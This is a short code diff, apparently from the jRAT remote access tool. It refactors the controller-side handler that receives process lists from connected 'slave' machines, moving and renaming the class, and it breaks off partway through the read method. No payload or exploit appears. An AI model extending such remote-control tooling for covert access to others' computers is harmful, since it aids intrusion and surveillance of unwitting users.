@@ -1,22 +1,22 @@
-package jrat.controller.packets.incoming;
+package jrat.module.process;
 
 import jrat.common.ProcessData;
 import jrat.controller.Slave;
+import jrat.controller.packets.incoming.AbstractIncomingPacket;
 import jrat.controller.ui.frames.FrameControlPanel;
-import jrat.controller.ui.frames.FrameRemoteProcess;
-import jrat.controller.ui.panels.PanelControlRemoteProcess;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
 
-public class Packet25Process extends AbstractIncomingPacket {
+public class PacketProcessData extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		try {
-			FrameRemoteProcess frame = FrameRemoteProcess.INSTANCES.get(slave);
+			FrameRemoteProcess frame = (FrameRemoteProcess) slave.getFrame(FrameRemoteProcess.class);
+
 			FrameControlPanel framecp = FrameControlPanel.instances.get(slave);
 
 			int count = dis.readByte();
